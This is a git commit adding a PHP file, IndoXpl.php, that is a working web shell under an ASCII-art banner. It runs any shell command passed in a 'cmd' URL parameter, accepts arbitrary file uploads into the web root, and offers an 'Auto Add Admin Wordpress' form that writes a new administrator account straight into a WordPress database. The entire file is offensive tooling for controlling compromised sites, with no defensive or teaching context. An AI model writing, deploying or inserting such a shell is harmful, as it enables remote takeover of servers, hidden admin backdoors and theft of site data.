8fa3fe57789b521d1e111bd5069884089a8d031c
@Notpino <159519253+notmuzakki@users.noreply.github.com>
2024-06-28 05:17:48 +0700

    test

---
+++ main/IndoXpl.php
@@ -0,0 +1,136 @@
+<?php
+echo "
+<center><b>
+<pre style='font-size:15px;text-align:center;color:black'>
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣷⣤⣀⠀⠀⠀⠀⠀⠉⠑⣶⣤⣄⣀⣠⣤⣶⣶⣿⣿⣿⣿⡇⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀⣀⠤⠒⠉⠈⢉⡉⠻⢿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
+⠀⠀⠀⠀⣀⣴⣶⣿⣷⡄⠀⠀⠀⠀⢹⣿⣿⣿⣿⠏⠁⠀⢀⠄⠀⠀⠈⢀⠄⠀⢀⡖⠁⠀⢀⠀⠈⠻⣿⣿⣿⣿⡏⠀⠀⠀⠀
+⠀⠀⢠⣾⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⢸⣿⣿⠏⠀⠀⢀⡴⠁⠀⠀⣠⠖⠁⢀⠞⠋⠀⢠⡇⢸⡄⠀⠀⠈⢻⣿⣿⠁⠀⠀⠀⠀
+⠀⣠⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⢸⡿⠁⠀⠀⢀⡞⠀⠀⢀⡴⠃⠀⣰⠋⠀⠀⣰⡿⠀⡜⢳⡀⠘⣦⠀⢿⡇⠀⠀⠀⠀⠀
+⢠⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⢰⣿⠃⠀⢀⠆⡞⡄⠀⣠⡞⠁⣀⢾⠃⠀⣀⡜⢱⠇⣰⠁⠈⣷⠂⢸⡇⠸⣵⠀⠀⠀⠀⠀
+⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⢠⣿⠇⠀⠀⡜⣸⡟⢀⣴⡏⢠⣾⠋⡎⢀⣼⠋⢀⡎⡰⠃⠀⠀⣿⣓⢒⡇⠀⣿⠀⠀⠀⠀⠀
+⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠴⢻⣟⢀⣀⢀⣧⡇⢨⠟⢾⣔⡿⠃⢸⢀⠞⠃⢀⣾⡜⠁⠀⠀⠀⡏⠁⢠⠃⠀⢹⠀⠀⠀⠀⠀
+⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⢸⣼⢸⣿⡟⢻⣿⠿⣶⣿⣿⣿⣶⣾⣏⣀⣠⣾⣿⠔⠒⠉⠉⢠⠁⡆⡸⠀⡈⣸⠀⠀⠀⠀⠀
+⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⣸⣿⣸⣿⣇⢸⠃⡄⢻⠃⣾⣿⢋⠘⣿⣿⠏⣿⡟⣛⡛⢻⣿⢿⣶⣷⣿⣶⢃⣿⠀⠀⠀⠀⠀
+⢸⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⣰⠃⣿⣿⣿⣿⠀⣸⣧⠈⣸⣿⠃⠘⠃⢹⣿⠀⣿⠃⠛⠛⣿⡇⢸⣿⡇⢸⣿⡿⣿⡀⠀⠀⠀⠀
+⠀⠻⣿⣿⣿⣿⣦⡀⠀⢀⡔⣹⣼⡟⡟⣿⣿⣿⠛⠻⠶⠿⠷⣾⣿⣿⣬⣿⣠⣿⣀⣿⣿⣿⡇⠸⡿⠀⣾⡏⢠⣿⣇⠀⠀⠀⠀
+⠀⠀⠙⢿⣿⣿⣿⣿⣷⡞⢠⣿⢿⡇⣿⡹⡝⢿⡷⣄⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠙⠛⠛⠻⠿⣶⣶⣾⣿⣇⣾⠉⢯⠃⠀⠀⠀
+⠀⠀⠀⠀⠙⠿⣿⣿⣿⠇⢸⠇⠘⣇⠸⡇⣿⣮⣳⡀⠉⠂⠀⠀⣀⣤⡤⢤⣀⠀⠀⠀⠀⠀⢈⣿⠟⣠⣾⠿⣿⡆⡄⣧⡀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠙⠻⡘⠾⣄⠀⠘⢦⣿⠃⠹⣿⣿⣶⠤⠀⠀⣿⠋⠉⠻⣿⠁⠀⠠⣀⣤⣾⣵⣾⡿⠃⣾⠏⣿⣧⠋⡇⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣠⠖⠳⣄⡈⠃⠀⠼⠋⠙⢷⣞⢻⣿⣿⣀⡀⠈⠤⣀⠬⠟⠀⢀⣠⣶⠿⢛⡽⠋⣠⣾⣏⣠⡿⣃⣞⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣧⠀⠀⠀⠉⠛⠓⠢⠶⣶⡤⠺⡟⢺⣿⠿⣿⣶⣤⣀⣠⣴⣾⡿⠿⢵⠋⠙⠲⣏⡝⠁⠀⣹⢿⡣⣌⠒⠄⠀
+⠀⠀⠀⠀⠀⠀⢸⠈⡄⠀⠇⠀⠀⡖⠁⢢⡞⠀⢰⠻⣆⡏⣇⠙⠻⣿⣿⣿⣿⠋⢀⡴⣪⢷⡀⠀⡘⠀⢀⠜⠁⢀⠟⢆⠑⢄⠀
+⠀⠀⠀⠀⠀⠀⠘⡄⠱⠀⠸⡀⠄⠳⡀⠀⢳⡀⢰⠀⢸⢇⡟⠑⠦⢈⡉⠁⢼⢠⡏⣴⠟⢙⠇⠀⡇⢠⠃⢀⡴⠁⠀⠘⠀⠈⡆
+⠀⠀⠀⠀⠀⠀⠀⠇⠀⠣⠀⡗⢣⡀⠘⢄⠀⢧⠀⢳⡟⠛⠙⣧⣧⣠⣄⣀⣠⢿⣶⠁⠀⠸⡀⠀⠓⠚⢴⣋⣠⠔⠀⠀⠀⠀⠁
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠧⡤⠙⢤⡈⣦⡼⠀⠀⠧⢶⠚⡇⠈⠁⠈⠃⠀⡰⢿⣄⠀⠀⠑⢤⣀⠀⠀⠀⠈⠁
+ __  __     __    _   ___      _      ___
+ \ \/ /_ __/ /__ (_) / _ \____(_)  __( _ )
+  \  / // /  '_// / / ___/ __/ / |/ / _  |
+  /_/\_,_/_/\_\/_/ /_/  /_/ /_/|___/\___/
+</b></pre>";
+?>
+<?php
+error_reporting(0);
+if (isset($_GET['cmd'])) {
+    $command = $_GET['cmd'];
+    $output = shell_exec($command);
+    echo "<pre style='text-align:left;margin-left:180px;'><b>$output</b></pre>";
+}
+
+$root = $_SERVER['DOCUMENT_ROOT'];
+$files = $_FILES['yuki_file']['name'];
+$dest = $root.'/'.$files;
+
+if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    if (isset($_POST['upload'])) {
+        if (is_writable($root)) {
+            if (@copy($_FILES['yuki_file']['tmp_name'], $dest)) {
+                $web = "http://".$_SERVER['HTTP_HOST']."/";
+                $output_message = "<b>Kyaaaa Yamete >_< </b> <a href='$web/$files' target='_blank'><b><u><font color='green' face='Courier New'>$web/$files</font></u></b></a>";
+            } else {
+                $output_message = "<font color='red' face='Courier New'><b>Failed Upload Document Root.</b></font>";
+            }
+        } else {
+            if (@copy($_FILES['yuki_file']['tmp_name'], $files)) {
+                $output_message = "Sukses upload <b><font color='green'>$files</b><font color='black' face='Courier New'> di folder ini";
+            } else {
+                $output_message = "<font color='red' face='Courier New'><b>Failed Upload Here</b></font>";
+            }
+        }
+    }
+}
+
+if (isset($_GET['cmd']) && $_GET['cmd'] === 'upload') {
+    echo '<html>';
+    echo '<head>';
+    echo '<style>.html { font-color: black; }</style>';
+    echo '</head>';
+    echo '<body>';
+    echo '<center><form style="margin-left: -5px;" method="POST" action="" enctype="multipart/form-data">';
+    echo '<input type="file" name="yuki_file">';
+    echo '<input type="submit" name="upload" value="Upload">';
+    echo '</form>';
+    if (isset($output_message)) {
+        echo "\n<b>$output_message</b>";
+    }
+    echo '</body>';
+    echo '</html>';
+    exit;
+}
+if (isset($_GET['cmd']) && $_GET['cmd'] === 'help') {
+    echo '<b>About Me: <font color="red">admin@yukinoshita.web.id</font></b>';
+}
+if (isset($_GET['cmd']) && $_GET['cmd'] === 'add') {
+    echo '<center><h2>Auto Add Admin Wordpress</h2></center>
+    <form method="post" style="text-align:center;"><pre>
+        <label for="db_host">MySQL Host:</label>
+        <input type="text" id="db_host" name="db_host" required><br>
+        <label for="db_name">Database Name:</label>
+        <input type text" id="db_name" name="db_name" required><br>
+        <label for="db_user">MySQL User:</label>
+        <input type="text" id="db_user" name="db_user" required><br>
+        <label for="db_password">MySQL Password:</label>
+        <input type="password" id="db_password" name="db_password" required><br>
+        <label for="table_prefix">Table Prefix:</label>
+        <input type="text" id="table_prefix" name="table_prefix" required><br>
+        <label for="admin_username">Admin Username:</label>
+        <input type="text" id="admin_username" name="admin_username" required><br>
+        <label for="admin_password">Admin Password:</label>
+        <input type="password" id="admin_password" name="admin_password" required><br>
+        <label for="admin_email">Admin Email:</label>
+        <input type="email" id="admin_email" name="admin_email" required><br>
+        <input type="submit" name="setup_admin_user" value="Setup Admin User">
+    </pre></form>';
+    if (isset($_POST["setup_admin_user"])) {
+        $db_host = $_POST["db_host"];
+        $db_name = $_POST["db_name"];
+        $db_user = $_POST["db_user"];
+        $db_password = $_POST["db_password"];
+        $table_prefix = $_POST["table_prefix"];
+        $admin_username = $_POST["admin_username"];
+        $admin_password = $_POST["admin_password"];
+        $admin_email = $_POST["admin_email"];
+        $mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);
+        if ($mysqli->connect_error) {
+            die("Gagal menghubungkan ke database: ". $mysqli->connect_error);
+        }
+        $admin_password_hash = password_hash($admin_password, PASSWORD_DEFAULT);
+        $query = "INSERT INTO {$table_prefix}users (user_login, user_pass, user_email) VALUES ('$admin_username','$admin_password_hash', '$admin_email')";
+        if ($mysqli->query($query) === true) {
+            $user_id = $mysqli->insert_id;
+            $query = "INSERT INTO {$table_prefix}usermeta (user_id, meta_key, meta_value) VALUES ('$user_id', '{$table_prefix}capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')";
+            if ($mysqli->query($query) === true) {
+                echo 'Pengguna admin berhasil dibuat. Berikut informasi login:<br>';
+                echo 'Username: ' . $admin_username . '<br>';
+                echo 'Password: ' . $admin_password . '<br>';
+            } else {
+                echo 'Gagal menambahkan peran administrator: ' . $mysqli->error;
+            }
+        } else {
+            echo 'Gagal membuat pengguna admin: ' . $mysqli->error;
+        }
+        $mysqli->close();
+    }
+}
+?>
